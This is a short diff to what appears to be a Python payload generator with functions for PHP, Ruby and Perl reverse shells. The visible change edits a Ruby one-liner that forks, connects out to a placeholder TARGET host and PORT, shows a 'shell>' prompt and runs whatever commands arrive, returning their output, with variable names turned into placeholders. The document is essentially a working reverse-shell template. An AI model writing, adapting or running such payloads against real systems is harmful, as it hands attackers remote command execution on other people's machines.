@@ -16,7 +16,7 @@ def REV_PHP_TCP():
 
 
 def REV_RUBY_TCP():
-    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|io|VAR1.print io.read}end" """
+    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|VAR3|VAR1.print VAR3.read}end" """
 
 
 def REV_PERL_TCP():
